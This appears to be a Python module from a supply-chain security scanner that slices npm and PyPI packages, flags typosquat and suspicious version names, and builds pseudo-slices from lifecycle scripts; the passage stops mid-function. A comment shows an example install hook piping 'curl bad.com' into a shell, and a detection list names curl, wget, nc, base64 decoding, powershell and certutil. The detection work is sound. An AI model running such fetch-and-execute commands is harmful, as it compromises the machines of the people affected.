"""串联 §4 流水线。

现在按"阶段"暴露两个独立入口：

- `pass1_only(...)` : 只做 Unpack → Filter → Locate → Slicer pass1
                     + 兜底 A + FP 缓释 + 兜底 G。**不做** Triage/Deob/Pass2。
                     用于"第一部分：首次切片"。
- `pass2_flow(...)` : 以 pass1 切片为输入，做 Triage → Deobfuscator → Slicer pass2
                     + 兜底 E/F；其中 LLM Triage 与 LLM 驱动的反混淆由
                     phase2_runner 侧以占位/stub 方式注入，此处保留完整数据通路。
- `process_package(...)`: 向后兼容旧 CLI 的组合入口，内部顺序调用上述两步。
"""
from __future__ import annotations

import json
import os
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

from .deobfuscator import DeobResult, deobfuscate_file
from .entry_point import ENTRY_LEVEL, locate_entries
from .ir import FunctionSlice, compute_slice_id
from .noise_filter import filter_files
from .obfuscation_triage import apply_triage, triage_slice
from .sink_registry import (
    NPM_SENSITIVE_MODULES,
    PY_SENSITIVE_MODULES,
    load_npm_sinks,
    load_py_sinks,
)
from .slicer_js import slice_js_file
from .slicer_py import slice_python_file
from .unpacker import UnpackResult, unpack_tarball
from .utils import detect_language, line_window, safe_read_text


# ----------------------------------------------------------------------
# NPM `package.json.scripts` 合成切片
#
# 很多 npm 恶意包把 payload 直接写在 package.json 的 lifecycle script 里
# （如 "postinstall": "curl bad.com | sh"），这些内联命令不会被 JS Slicer 切到。
# 为此：对每个 npm 包，若 package.json 里存在 preinstall/install/postinstall/prepare/
# prepublish/postpublish 等 lifecycle key，合成一条 __npm_scripts__ 伪切片，
# sink_kind=static、sink=["__npm_lifecycle_script__"]、entry_kind=npm_lifecycle。
# ----------------------------------------------------------------------

NPM_LIFECYCLE_SCRIPT_KEYS = {
    "preinstall", "install", "postinstall",
    "prepare", "prepublish", "postpublish",
    "preuninstall", "postuninstall",
    "prepack", "postpack",
}


# ----------------------------------------------------------------------
# Step 3 辅助：NPM 常见 top 包名清单（离线一份，给 typosquat 距离检测用）
# 选择原则：真实 npm top-downloads 前 ~100 + 生态热门库名，避免完美命中时误报。
# ----------------------------------------------------------------------

NPM_TOP_PACKAGE_NAMES: Set[str] = {
    "lodash", "react", "react-dom", "chalk", "express", "commander",
    "axios", "moment", "request", "async", "underscore", "uuid",
    "minimist", "debug", "inquirer", "yargs", "mkdirp", "rimraf",
    "fs-extra", "colors", "bluebird", "dotenv", "winston", "jsonwebtoken",
    "body-parser", "cors", "cheerio", "semver", "glob", "webpack",
    "babel-core", "typescript", "jquery", "socket.io", "mongoose",
    "redis", "bcrypt", "passport", "nodemon", "eslint", "prettier",
    "jest", "mocha", "chai", "sinon", "puppeteer", "electron", "vue",
    "vuex", "vue-router", "angular", "rxjs", "graphql", "apollo-client",
    "prop-types", "classnames", "styled-components", "material-ui",
    "ant-design", "antd", "ramda", "immutable", "lru-cache",
    "node-fetch", "form-data", "multer", "helmet", "ws", "pm2",
    "pug", "ejs", "handlebars", "marked", "highlight.js", "moment-timezone",
    "date-fns", "dayjs", "yup", "joi", "validator", "formidable",
    "sharp", "jimp", "nodemailer", "sendgrid", "stripe", "aws-sdk",
    "firebase", "next", "nuxt", "gatsby", "tailwindcss", "postcss",
    "sass", "less", "bootstrap", "popper.js", "core-js", "regenerator-runtime",
    "tslib", "zone.js", "rxjs-compat", "reselect", "redux", "react-redux",
    "redux-thunk", "redux-saga", "recompose", "react-router", "react-router-dom",
    "history", "enzyme", "querystring", "url", "path", "fs", "http",
    "os", "util", "events", "stream", "crypto", "buffer", "nan",
    "node-gyp", "node-pre-gyp", "color", "color-convert", "escape-string-regexp",
    "ansi-styles", "strip-ansi", "supports-color", "has-flag", "is-stream",
    "pump", "through2", "readable-stream", "string_decoder", "safe-buffer",
    "ini", "semver-regex", "is-promise", "p-limit", "p-map", "p-queue",
    "asynckit", "combined-stream", "mime-types", "mime-db", "qs",
    "iconv-lite", "tough-cookie", "psl", "punycode",
}


def _levenshtein(a: str, b: str) -> int:
    if a == b:
        return 0
    if not a:
        return len(b)
    if not b:
        return len(a)
    m, n = len(a), len(b)
    if m > n:
        a, b = b, a
        m, n = n, m
    prev = list(range(m + 1))
    for i in range(1, n + 1):
        cur = [i] + [0] * m
        for j in range(1, m + 1):
            cost = 0 if b[i - 1] == a[j - 1] else 1
            cur[j] = min(cur[j - 1] + 1, prev[j] + 1, prev[j - 1] + cost)
        prev = cur
    return prev[m]


def _extract_npm_clean_name(package_name: str) -> Tuple[str, str]:
    """把 '@scope/foo-1.2.3' / '@scope#foo-1.2.3' 拆成 (scope_or_'', short_name)。

    例：
      '1337qq-js-1.0.10'         -> ('', '1337qq-js')
      '@alfalab#core-components-37.3.0-beta.10' -> ('@alfalab', 'core-components')
      'lru-cache-6.0.0'          -> ('', 'lru-cache')
    """
    name = package_name
    # 去掉版本号后缀
    # 简单策略：从右侧找 '-<digit>'，截断
    import re
    m = re.search(r"-\d", name)
    if m:
        name = name[: m.start()]
    scope = ""
    if name.startswith("@"):
        # '@scope#pkg' 或 '@scope/pkg'
        sep_idx = max(name.find("#"), name.find("/"))
        if sep_idx > 0:
            scope = name[:sep_idx]
            name = name[sep_idx + 1:]
    return scope, name


def _extract_version_from_package_name(package_name: str) -> str:
    """从 'foo-1.2.3' / '@scope#foo-1.2.3' 中抽取版本号字符串（尽力而为）。"""
    import re
    # 去掉 scope 部分
    name = package_name
    if name.startswith("@"):
        sep = max(name.find("#"), name.find("/"))
        if sep > 0:
            name = name[sep + 1:]
    # 找最后一个 '-<digit>' 之后的部分
    m = re.search(r"-(\d[\d\w\.\-]*)$", name)
    return m.group(1) if m else ""


def _check_version_anomaly(version: str) -> Tuple[int, List[str]]:
    """检测异常版本号（典型 dependency-confusion / typosquat 特征）。

    返回 (risk_score, reasons)。
    """
    if not version:
        return 0, []
    reasons: List[str] = []
    score = 0
    # 典型恶意模式：9999.x、99.99.99、10.99.99 这种"超高版本号故意压过真包"
    # 统一策略：拿 major.minor.patch 三段数字来看
    import re
    m = re.match(r"(\d+)(?:\.(\d+))?(?:\.(\d+))?", version)
    if m:
        major = int(m.group(1))
        minor = int(m.group(2)) if m.group(2) else 0
        patch = int(m.group(3)) if m.group(3) else 0
        # 明显"超高版本"特征
        if major >= 9999 or minor >= 9999 or patch >= 9999:
            reasons.append(f"version {version!r} contains ≥9999 component (dep-confusion 典型特征)")
            score += 70
        elif major >= 100:
            reasons.append(f"version {version!r} has major >= 100 (异常高版本)")
            score += 35
        # 典型"所有段都是 9"：99.99.99、9.99.99、99.9.9、9.9.9 等
        if major >= 9 and minor >= 9 and patch >= 9:
            reasons.append(f"version {version!r} all-9s pattern (典型恶意版本号)")
            score += 50
    # 版本里含 "bait"/"test"/"payload" 等
    low = version.lower()
    for kw in ("bait", "payload", "exploit", "poc", "test"):
        if kw in low:
            reasons.append(f"version {version!r} contains suspicious keyword {kw!r}")
            score += 30
            break
    return score, reasons


def _check_npm_typosquat(package_name: str) -> Dict:
    """返回结构化 typosquat 风险信号。"""
    scope, short = _extract_npm_clean_name(package_name)
    version = _extract_version_from_package_name(package_name)

    signals: Dict = {
        "package_name": package_name,
        "scope": scope,
        "short_name": short,
        "version": version,
        "suspicious_score": 0,     # 0-100
        "reasons": [],
    }

    # A) short_name 与 top 清单距离 1-2 且不完全相等 -> typosquat 嫌疑
    best_match = None
    best_dist = 999
    for known in NPM_TOP_PACKAGE_NAMES:
        if short == known:
            best_match = known
            best_dist = 0
            break
        d = _levenshtein(short, known)
        if d < best_dist:
            best_dist = d
            best_match = known
    if 1 <= best_dist <= 2:
        signals["typosquat_candidate"] = best_match
        signals["typosquat_distance"] = best_dist
        signals["reasons"].append(
            f"name '{short}' within edit-distance {best_dist} of known top package '{best_match}'"
        )
        signals["suspicious_score"] += 60 if best_dist == 1 else 35

    # B) scope 异常：全数字 / 十六进制超长
    if scope:
        s = scope.lstrip("@")
        if s.isdigit() or all(c in "0123456789abcdefABCDEF" for c in s):
            if len(s) >= 8:
                signals["reasons"].append(f"scope '{scope}' looks like hex/numeric burner ({len(s)} chars)")
                signals["suspicious_score"] += 50
        if s.count("0") >= 10:
            signals["reasons"].append(f"scope '{scope}' contains ≥ 10 zeros (auto-generated)")
            signals["suspicious_score"] += 40

    # C) short_name 含异常字符
    bad_chars = sum(1 for c in short if not (c.isalnum() or c in "-_."))
    if bad_chars >= 1:
        signals["reasons"].append(f"name has {bad_chars} non-standard chars")
        signals["suspicious_score"] += 10

    # D) short_name 太短或太长
    if len(short) <= 2:
        signals["reasons"].append(f"name '{short}' suspiciously short")
        signals["suspicious_score"] += 20

    # E) 异常版本号（改进 ①：9999.*、99.99.99、高 major 等 dependency-confusion 套路）
    ver_score, ver_reasons = _check_version_anomaly(version)
    if ver_score > 0:
        signals["version_anomaly_score"] = ver_score
        signals["suspicious_score"] += ver_score
        signals["reasons"].extend(ver_reasons)

    return signals


def _synthesize_npm_package_name_check(package: str) -> List[FunctionSlice]:
    """若包名可疑，合成一条 __package_name_check__ 伪切片送 Judge。"""
    signals = _check_npm_typosquat(package)
    if signals["suspicious_score"] < 20:
        return []    # 名字正常，不合成

    lines: List[str] = [
        "// synthesized: NPM package-name/version typosquat & anomaly check",
        f"// package_name      = {signals['package_name']!r}",
        f"// scope             = {signals['scope']!r}",
        f"// short_name        = {signals['short_name']!r}",
        f"// version           = {signals.get('version', '')!r}",
        f"// suspicious_score  = {signals['suspicious_score']} (0-100)",
    ]
    if "typosquat_candidate" in signals:
        lines.append(
            f"// typosquat_target  = {signals['typosquat_candidate']!r}  "
            f"(Levenshtein distance = {signals['typosquat_distance']})"
        )
    if "version_anomaly_score" in signals:
        lines.append(
            f"// version_anomaly   = True (score {signals['version_anomaly_score']})"
        )
    lines.append("// reasons:")
    for r in signals["reasons"]:
        lines.append(f"//   - {r}")
    source = "\n".join(lines)

    sinks_list = ["__package_name_check__"]
    sid = compute_slice_id(package, "package.json", "__package_name_check__", sinks_list, 0)
    return [FunctionSlice(
        slice_id=sid,
        package=package,
        ecosystem="npm",
        file="package.json",
        entry_kind="npm_lifecycle",    # 视作安装时信号
        sink=sinks_list,
        sink_kind="static",
        func_name="__package_name_check__",
        func_range=(1, len(lines)),
        source_code=source,
        callees_inline=[],
        imports=[],
        reslice_version=0,
        parent_slice_id=None,
        was_obfuscated=False,
        deob_tool=None,
        confidence_hint={
            "package_name_anomaly": True,
            "typosquat_score": signals["suspicious_score"],
            "typosquat_target": signals.get("typosquat_candidate"),
            "typosquat_distance": signals.get("typosquat_distance"),
            "version": signals.get("version", ""),
            "version_anomaly_score": signals.get("version_anomaly_score", 0),
            "name_reasons": signals["reasons"],
        },
    )]


# ----------------------------------------------------------------------
# Step 1 辅助：同 (file, entry_kind) 下切片数超阈值 -> 合并成 __file_digest__
#
# 动机：良性大包（Angular cdk 338 切片）或某些恶意包在同一文件里切出大量
# 内容重复的函数级切片。LLM 反复判同样的 benign 框架代码既浪费 token、
# 又稀释真正的恶意信号。
#
# 策略：
#   - 同 (file, entry_kind) 切片数 >= 阈值（默认 6）时触发合并；
#   - 保留所有 obf_class != none 或 sink_kind != static 的"疑似"切片（它们不合并）；
#   - 其余 "平凡" 切片合并成 1 条 __file_digest__ 切片，content 保留每条切片的
#     func_name / sink / 前 6 行源码 + 全局熵值上下文；
#   - 合并后的 __file_digest__ 继承原切片中最高危的 entry_kind。
# ----------------------------------------------------------------------

FILE_DIGEST_THRESHOLD = 6   # 同文件切片数 >= 此值触发合并
FILE_DIGEST_MAX_ENTRIES = 12  # digest 里最多列多少条原切片
FILE_DIGEST_HEAD_LINES = 6    # 每条原切片取前几行进入 digest

# Step 5（v2 新增）：跨文件 trivial 合并阈值
# 大型官方 SDK 风格的包（如 aliyunsdkrds）会在 200+ 个文件里写完全一致的
# `__init__` setattr 模板，每文件 1 条 → _merge_same_file_slices 不触发，
# 但累计起来仍是 200+ 条噪声切片，会拉爆 triage tokens 与 LLM 时间。
# 这里加一道"按 (entry_kind, sink_set, 源码签名) 跨文件合并"，把它们压成 1 条。
CROSSFILE_TRIVIAL_THRESHOLD = 8  # 同签名的 trivial 切片数 >= 此值时合并
CROSSFILE_TRIVIAL_SIG_LINES = 6  # 计算签名时取前几行（去空白/注释/缩进）
# 改进 ②：长切片（源代码超过此行数）视为信息密度高，豁免合并，保留独立送 Judge
# 这能避免把真正的函数体被稀释到 digest 里。设 50 行是经验值。
FILE_DIGEST_LONG_SLICE_EXEMPT = 50


def _merge_same_file_slices(
    slices: List[FunctionSlice],
) -> List[FunctionSlice]:
    """对同 (file, entry_kind) 下切片数过多的文件做 digest 合并。"""
    if not slices:
        return slices

    buckets: Dict[Tuple[str, str], List[FunctionSlice]] = {}
    unbucketed: List[FunctionSlice] = []
    for s in slices:
        # 伪切片（__npm_scripts__ / __package_name_check__ / __toplevel__ 等）不参与合并
        # 只合并"函数级"切片，避免破坏 §7 兜底
        if s.func_name.startswith("__") and s.func_name.endswith("__") \
                and s.func_name not in ("__toplevel__", "__classbody__"):
            unbucketed.append(s)
            continue
        if s.file == "package.json":
            unbucketed.append(s)
            continue
        key = (s.file, s.entry_kind)
        buckets.setdefault(key, []).append(s)

    merged: List[FunctionSlice] = list(unbucketed)
    for key, group in buckets.items():
        if len(group) < FILE_DIGEST_THRESHOLD:
            merged.extend(group)
            continue

        # 把"疑似"切片保留原样（静态 none 以外的，或命中 reflection/dynamic 的）
        # 改进 ②：长切片（非空行 ≥ FILE_DIGEST_LONG_SLICE_EXEMPT）也豁免，
        # 避免真正的函数体被合并稀释。
        keep_as_is: List[FunctionSlice] = []
        to_digest: List[FunctionSlice] = []
        for s in group:
            is_trivial = (s.obf_class == "none") and (s.sink_kind == "static") \
                and (not s.confidence_hint.get("has_fingerprint"))
            non_empty_lines = sum(1 for ln in s.source_code.splitlines() if ln.strip())
            is_long = non_empty_lines >= FILE_DIGEST_LONG_SLICE_EXEMPT
            if is_trivial and not is_long:
                to_digest.append(s)
            else:
                keep_as_is.append(s)

        if not to_digest or len(to_digest) < FILE_DIGEST_THRESHOLD:
            # 合并阈值没到 -> 放弃合并
            merged.extend(group)
            continue

        # 构造 digest 切片
        file_rel, entry_kind = key
        total = len(to_digest)
        picked = to_digest[:FILE_DIGEST_MAX_ENTRIES]
        lines: List[str] = [
            f"// __file_digest__ : merged {total} trivial slices in {file_rel}",
            f"// entry_kind      : {entry_kind}",
            f"// sink_kinds      : static (all trivial)",
            "",
        ]
        for i, s in enumerate(picked, 1):
            sink_desc = ",".join(s.sink[:4])
            head_src = "\n".join(s.source_code.splitlines()[:FILE_DIGEST_HEAD_LINES])
            lines.append(f"// --- slice {i}/{total}: func={s.func_name} sinks=[{sink_desc}] ---")
            lines.append(head_src.rstrip())
            lines.append("")
        if total > FILE_DIGEST_MAX_ENTRIES:
            lines.append(f"// ... and {total - FILE_DIGEST_MAX_ENTRIES} more similar trivial slices omitted ...")
        source_code = "\n".join(lines)

        # 聚合 sink 列表 & imports
        sink_union: Set[str] = set()
        imports_union: Set[str] = set()
        for s in to_digest:
            for sk in s.sink:
                sink_union.add(sk)
            for imp in s.imports:
                imports_union.add(imp)

        digest_sinks = sorted(sink_union) or ["__file_digest__"]
        sid = compute_slice_id(
            to_digest[0].package, file_rel, "__file_digest__",
            digest_sinks, 0,
        )
        ecosystem = to_digest[0].ecosystem
        digest_slice = FunctionSlice(
            slice_id=sid,
            package=to_digest[0].package,
            ecosystem=ecosystem,
            file=file_rel,
            entry_kind=entry_kind,
            sink=digest_sinks,
            sink_kind="static",
            func_name="__file_digest__",
            func_range=(1, len(lines)),
            source_code=source_code,
            callees_inline=[],
            imports=sorted(imports_union),
            reslice_version=0,
            parent_slice_id=None,
            was_obfuscated=any(s.was_obfuscated for s in to_digest),
            deob_tool=None,
            confidence_hint={
                "file_digest": True,
                "merged_slice_count": total,
                "file_entry_kind": entry_kind,
            },
        )

        merged.extend(keep_as_is)
        merged.append(digest_slice)

    return merged


# ----------------------------------------------------------------------
# v2 改进 ⑤：跨文件 trivial 切片合并
#
# 适用场景：
#   - 大型官方 SDK 风格的包，例如 python-aliyun-sdk-rds：195 个 *.py 文件，
#     每个文件 1 条 __init__ 的 setattr 切片，源码模板完全一致。
#   - _merge_same_file_slices 是按 (file, entry_kind) 分组，每组只有 1 条
#     就达不到 FILE_DIGEST_THRESHOLD，不会触发合并 → 全部 195 条流向 triage。
#
# 策略：
#   - 只对真正的 "trivial" 切片做（obf_class=none + sink_kind=static + 无指纹）
#   - 按 (entry_kind, sink_set, 源码签名) 分桶
#   - 同桶 ≥ CROSSFILE_TRIVIAL_THRESHOLD 时，合并成 1 条 __crossfile_digest__
#   - 合成切片不进入"高危入口"（用桶内最高的 entry_lv → entry_kind），
#     保留 LLM 仍能看到模板和涉及文件清单。
#
# 风险控制：
#   - 永远不合并伪切片（__npm_scripts__ / __package_name_check__ / __toplevel__ 等）
#   - 永远不合并被 _merge_same_file_slices 已合成的 __file_digest__ 切片
#   - 签名只取前 6 个非空非注释行 hash，命中精确，不会误聚不同模板
# ----------------------------------------------------------------------

import hashlib as _hashlib_for_sig  # 局部别名避免与上方 hashlib 用法冲突
import re as _re_for_sig

# 字符串字面量（'...' 或 "..."）& 数字 -> 占位符
# 用于在签名里抹掉 SDK 模板的字面参数差异（API 名、版本号、URL 等），
# 保留结构骨架。这样 200 个不同 API 的 RpcRequest.__init__ 会合并到同一签名。
_LITERAL_STR_RE = _re_for_sig.compile(r"(?:'[^']*'|\"[^\"]*\")")
_LITERAL_NUM_RE = _re_for_sig.compile(r"\b\d+(?:\.\d+)?\b")


def _trivial_signature(s: FunctionSlice) -> str:
    """对一条 trivial 切片计算源码签名（用于跨文件合并）。

    取前 N 行（去掉空行、注释行、行首缩进），将字符串字面量替换为 ``_S_``、
    数字替换为 ``_N_`` 后 hash。这样同一函数体模板（即使字面量不同）会合并到
    同一签名；不同模板/库的函数仍然区分。
    """
    norm: List[str] = []
    for line in (s.source_code or "").splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        # 抹掉字面量
        masked = _LITERAL_STR_RE.sub("_S_", stripped)
        masked = _LITERAL_NUM_RE.sub("_N_", masked)
        norm.append(masked)
        if len(norm) >= CROSSFILE_TRIVIAL_SIG_LINES:
            break
    if not norm:
        return ""
    return _hashlib_for_sig.md5("\n".join(norm).encode("utf-8")).hexdigest()[:12]


# 这些 func_name 是流水线合成的"伪切片"，不参与跨文件合并。
# 注意：不要把所有 __xxx__ 形式都当伪切片——Python dunder（__init__ /
# __call__ / __repr__ ...）是普通方法，必须能被合并。
_PSEUDO_SLICE_FUNC_NAMES = {
    "__npm_scripts__",
    "__package_name_check__",
    "__file_digest__",
    "__crossfile_digest__",
    "__wholefile__",
}


def _merge_similar_trivial_across_files(
    slices: List[FunctionSlice],
) -> List[FunctionSlice]:
    """把分散在多个文件、源码模板一致的 trivial 切片合并成 1 条 digest。

    见上方注释。返回新的切片列表（保留所有未合并的切片原样）。
    """
    if not slices:
        return slices

    bucket: Dict[Tuple[str, str, str], List[FunctionSlice]] = {}
    others: List[FunctionSlice] = []

    for s in slices:
        # 流水线合成的伪切片永不合并（见 _PSEUDO_SLICE_FUNC_NAMES 注释）
        if s.func_name in _PSEUDO_SLICE_FUNC_NAMES:
            others.append(s)
            continue
        # 已经被 _merge_same_file_slices 合成的也不再处理
        if s.confidence_hint.get("file_digest"):
            others.append(s)
            continue
        is_trivial = (
            s.obf_class == "none"
            and s.sink_kind == "static"
            and not s.confidence_hint.get("has_fingerprint")
        )
        if not is_trivial:
            others.append(s)
            continue
        sig = _trivial_signature(s)
        if not sig:
            others.append(s)
            continue
        sink_key = "|".join(sorted(s.sink))
        bucket.setdefault((s.entry_kind, sink_key, sig), []).append(s)

    out: List[FunctionSlice] = list(others)
    for (entry_kind, sink_key, sig), group in bucket.items():
        if len(group) < CROSSFILE_TRIVIAL_THRESHOLD:
            out.extend(group)
            continue

        total = len(group)
        sample = group[0]
        files = sorted({g.file for g in group})
        sinks = sample.sink

        head_src = "\n".join(
            (sample.source_code or "").splitlines()[:FILE_DIGEST_HEAD_LINES]
        )
        files_preview = files[:8]
        files_extra = max(0, len(files) - 8)
        body_lines = [
            f"// __crossfile_digest__ : merged {total} similar trivial slices "
            f"across {len(files)} files",
            f"// entry_kind     : {entry_kind}",
            f"// sink           : {','.join(sinks[:6])}",
            f"// signature      : {sig}",
            "// representative source (first slice):",
            head_src.rstrip(),
            "",
            "// affected files (sample):",
        ]
        body_lines.extend(f"//   {f}" for f in files_preview)
        if files_extra:
            body_lines.append(f"//   ... and {files_extra} more files omitted ...")
        source_code = "\n".join(body_lines)

        imports_union: Set[str] = set()
        for g in group:
            for imp in g.imports:
                imports_union.add(imp)

        sid = compute_slice_id(
            sample.package, "__crossfile_digest__", "__crossfile_digest__",
            sinks, 0,
        )
        digest_slice = FunctionSlice(
            slice_id=sid,
            package=sample.package,
            ecosystem=sample.ecosystem,
            file=files_preview[0],  # 选第一个代表，避免 file 为空
            entry_kind=entry_kind,
            sink=sinks,
            sink_kind="static",
            func_name="__crossfile_digest__",
            func_range=(1, len(body_lines)),
            source_code=source_code,
            callees_inline=[],
            imports=sorted(imports_union),
            reslice_version=0,
            parent_slice_id=None,
            was_obfuscated=False,
            deob_tool=None,
            confidence_hint={
                "crossfile_digest": True,
                "merged_slice_count": total,
                "merged_file_count": len(files),
                "signature": sig,
                "sample_files": files_preview,
            },
        )
        out.append(digest_slice)

    return out


# 命令字符串里出现以下模式时强先验：几乎可以确认恶意
NPM_SUSPICIOUS_CMD_PATTERNS = (
    "curl ", "wget ", "| sh", "|sh", "| bash", "|bash",
    "base64 -d", "base64 --decode", "eval ",
    "echo ", " nc ", "/bin/sh -c", "/bin/bash -c",
    "python -c", "node -e ", "powershell",
    "cmd.exe /c", "certutil", "bitsadmin",
)


def _synthesize_npm_lifecycle_slices(
    extract_dir: str,
    package: str,
) -> List[FunctionSlice]:
    """读取 package.json 合成 __npm_scripts__ 伪切片（最多 1 条）。"""
    pkg_json_path = os.path.join(extract_dir, "package.json")
    if not os.path.isfile(pkg_json_path):
        return []
    try:
        with open(pkg_json_path, "r", encoding="utf-8") as f:
            meta = json.load(f)
    except Exception:
        return []

    scripts = meta.get("scripts") or {}
    if not isinstance(scripts, dict):
        scripts = {}

    lifecycle = {
        k: v for k, v in scripts.items()
        if k in NPM_LIFECYCLE_SCRIPT_KEYS and isinstance(v, str) and v.strip()
    }

    # 即便没有 lifecycle scripts，若 bin / 其它 scripts 指向可疑命令也合成一条
    other_scripts = {
        k: v for k, v in scripts.items()
        if k not in NPM_LIFECYCLE_SCRIPT_KEYS and isinstance(v, str) and v.strip()
    }
    has_suspicious_other = any(
        any(p in v for p in NPM_SUSPICIOUS_CMD_PATTERNS)
        for v in other_scripts.values()
    )

    if not lifecycle and not has_suspicious_other:
        # 没有任何 lifecycle script、也没有可疑 other scripts：不合成（避免给普通包加噪音）
        # 仍然检查 bin 字段（非字符串命令）
        if not meta.get("bin") and not scripts:
            return []
        # 只是普通 bin/scripts，不合成
        if not scripts:
            return []
        # 有普通 scripts（test/build 等）但无可疑 —— 跳过合成
        return []

    # 构造 source_code：以人类可读形式展示所有 scripts + 部分 meta
    lines: List[str] = []
    lines.append("// synthesized from package.json (NPM package meta + scripts)")
    lines.append(f"// package: {meta.get('name')!r}  version: {meta.get('version')!r}")
    if meta.get("bin"):
        lines.append(f"// bin: {json.dumps(meta.get('bin'), ensure_ascii=False)}")
    if meta.get("main"):
        lines.append(f"// main: {meta.get('main')}")
    lines.append("")
    if lifecycle:
        lines.append("// *** lifecycle scripts (run automatically on install/publish) ***")
        for k, v in lifecycle.items():
            lines.append(f"scripts.{k:<14s} = {v!r}")
        lines.append("")
    if other_scripts:
        lines.append("// other scripts:")
        for k, v in other_scripts.items():
            lines.append(f"scripts.{k:<14s} = {v!r}")

    source_code = "\n".join(lines)

    # 命令关键词扫描作为强先验
    suspicious_hits: List[str] = []
    combined_cmd = " ".join(lifecycle.values()) + " " + " ".join(other_scripts.values())
    for pat in NPM_SUSPICIOUS_CMD_PATTERNS:
        if pat in combined_cmd:
            suspicious_hits.append(pat.strip())

    sinks_list = ["__npm_lifecycle_script__"]
    sid = compute_slice_id(package, "package.json", "__npm_scripts__", sinks_list, 0)
    slc = FunctionSlice(
        slice_id=sid,
        package=package,
        ecosystem="npm",
        file="package.json",
        entry_kind="npm_lifecycle",
        sink=sinks_list,
        sink_kind="static",
        func_name="__npm_scripts__",
        func_range=(1, len(source_code.splitlines()) or 1),
        source_code=source_code,
        callees_inline=[],
        imports=[],
        reslice_version=0,
        parent_slice_id=None,
        was_obfuscated=False,
        deob_tool=None,
        confidence_hint={
            "npm_scripts_synth": True,
            "lifecycle_keys": sorted(lifecycle.keys()),
            "has_suspicious_shell_pattern": bool(suspicious_hits),
            "suspicious_shell_hits": suspicious_hits,
        },
    )
    return [slc]


@dataclass
class PackageResult:
    package: str
    ecosystem: str
    tarball: str
    extract_dir: str
    keep_count: int = 0
    dropped_count: int = 0
    pass1_count: int = 0
    pass2_count: int = 0
    dyn_archive_count: int = 0
    deob_summary: Dict[str, int] = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)

    # 计时（单位：毫秒）
    elapsed_ms_unpack: float = 0.0
    elapsed_ms_filter: float = 0.0
    elapsed_ms_locate: float = 0.0
    elapsed_ms_slice_pass1: float = 0.0
    elapsed_ms_triage: float = 0.0
    elapsed_ms_deob: float = 0.0
    elapsed_ms_slice_pass2: float = 0.0
    elapsed_ms_total: float = 0.0


@dataclass
class Pass1Artifact:
    """Phase 1 输出：把 pass1 阶段的所有中间状态固化下来，供 Phase 2 使用。"""
    result: PackageResult
    pass1_slices: List[FunctionSlice]
    silenced_slices: List[FunctionSlice]
    # Phase 2 需要的上下文
    keep_files: List[str]
    entry_map: Dict[str, str]
    extract_dir: str
    ecosystem: str
    package: str
    npm_sinks: Set[str]


# ----------------------------------------------------------------------
# 单个文件的 pass1 切片
# ----------------------------------------------------------------------

def _slice_file_pass1(
    extract_dir: str,
    file_rel: str,
    package: str,
    ecosystem: str,
    entry_kind: str,
    npm_sinks: Set[str],
) -> List[FunctionSlice]:
    abs_path = os.path.join(extract_dir, file_rel)
    source = safe_read_text(abs_path)
    if source is None:
        return []

    lang = detect_language(file_rel)
    if lang == "py":
        return slice_python_file(
            source=source, file_rel=file_rel, package=package,
            entry_kind=entry_kind, reslice_version=0,
        )
    if lang == "js":
        return slice_js_file(
            source=source, file_rel=file_rel, package=package,
            entry_kind=entry_kind, sinks=npm_sinks, reslice_version=0,
        )
    return []


# ----------------------------------------------------------------------
# §4.6.x FP 缓释（dynamic 切片静默归档）
# ----------------------------------------------------------------------

_IO_TOKENS_PY = (
    "os.system", "subprocess", "socket", "requests", "urllib", "http.",
    "pickle.", "marshal.", "shutil.", "open(",
    "os.environ", "base64.", "codecs.decode", "exec(", "eval(",
    "getattr(", "setattr(", "__import__",
)
_IO_TOKENS_JS = (
    "child_process", "fs.", "http.", "https.", "net.", "dns.",
    "process.env", "fetch", "XMLHttpRequest", "Buffer.from",
    "atob(", "btoa(", "eval(", "new Function",
    "execSync", "spawnSync", "exec(", "spawn(",
    "os.homedir", "os.userInfo", "os.networkInterfaces",
    "crypto.", "zlib.", "require(",  # require 的参数是变量/拼接时算证据
)


def _has_io_evidence(slice_obj: FunctionSlice) -> bool:
    text = slice_obj.source_code + "\n" + "\n".join(slice_obj.callees_inline)
    if slice_obj.ecosystem == "npm":
        toks = _IO_TOKENS_JS
    else:
        toks = _IO_TOKENS_PY
    return any(t in text for t in toks)


# sink_kind=reflection 但实际上是 JS 的 Reflect.get/Reflect.apply/Reflect.construct
# 这类 ES6 标准 API 在现代 npm 库里非常常见（React/Angular/Vue 都大量使用），
# 绝大多数与恶意无关。我们按以下启发式对 reflection 切片做 FP 缓释：
#   - 切片内没有 IO / exec / fs / child_process / process.env 等痕迹
#   - 且所在文件 entry_kind > 2（非安装期/import 期自动执行）
#   - 且同 (file, func_name) 下也没有静态 Sink 命中
# 满足以上条件 → 静默归档（不送 LLM 也不入 Pool 主表）
# 这是相对 rules.md §4.6.x 的扩展，目标是把 npm 的切片冗余压下来。
# 用户可通过 `--keep-reflection` 关闭本规则。


def apply_dynamic_probe_silencing(
    slices: List[FunctionSlice],
    entry_kind_map: Dict[str, str],
    silence_reflection: bool = True,
) -> Tuple[List[FunctionSlice], List[FunctionSlice]]:
    """返回 (active_slices, silenced_slices)。silenced 的切片写入 dyn_probe_archive。

    silence_reflection=True 时对 sink_kind=reflection 也执行同样的缓释规则
    （默认开启，目的是压低 npm 侧切片冗余；恶意包的反射调用通常伴随 IO 痕迹或
    出现在高危入口里，不会被误杀）。
    """
    # 建索引：同 (file, func_name) 下是否有 static 命中
    static_keys: Set[Tuple[str, str]] = set()
    for s in slices:
        if s.sink_kind == "static":
            static_keys.add((s.file, s.func_name))

    active: List[FunctionSlice] = []
    silenced: List[FunctionSlice] = []
    for s in slices:
        kind = s.sink_kind
        candidate = (kind == "dynamic") or (silence_reflection and kind == "reflection")
        if not candidate:
            active.append(s)
            continue

        entry = entry_kind_map.get(s.file, "unknown")
        entry_lv = ENTRY_LEVEL.get(entry, 9)
        has_io = _has_io_evidence(s)
        co_static = (s.file, s.func_name) in static_keys

        if has_io or entry_lv <= 2 or co_static:
            active.append(s)
        else:
            if kind == "dynamic":
                s.confidence_hint["dynamic_probe_silent"] = True
            else:
                s.confidence_hint["reflection_silent"] = True
            silenced.append(s)
    return active, silenced


# ----------------------------------------------------------------------
# §7 兜底 G：动态探针静默归档 + 高危入口 -> 补 __toplevel__ 伪函数切片
# ----------------------------------------------------------------------

def _fallback_G_build_toplevel_for_silent_files(
    extract_dir: str,
